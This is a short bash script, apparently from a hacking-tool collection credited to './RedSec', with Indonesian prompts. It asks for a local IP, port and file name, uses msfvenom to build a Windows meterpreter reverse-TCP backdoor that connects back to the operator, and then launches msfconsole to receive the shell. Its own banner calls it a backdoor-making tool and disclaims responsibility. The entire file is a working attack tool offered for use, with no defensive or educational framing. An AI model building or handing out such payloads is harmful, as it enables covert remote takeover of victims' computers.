#!/bin/bash

clear
toilet -f future Msec Windows
echo "Create By ./RedSec"
echo "======================"
echo "These Tools Are Backdoor Making 
Tools So If Something Happens With Your 
Actions We Are Not Responsible"
echo "======================"
read -p "Masukan Local IP = " int1
read -p "Masukan Port ( Bebas ) = " int2
read -p "Masukan Nama Backdoor = " int3
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$int1 LPORT=$int2 R > $int3

msfconsole
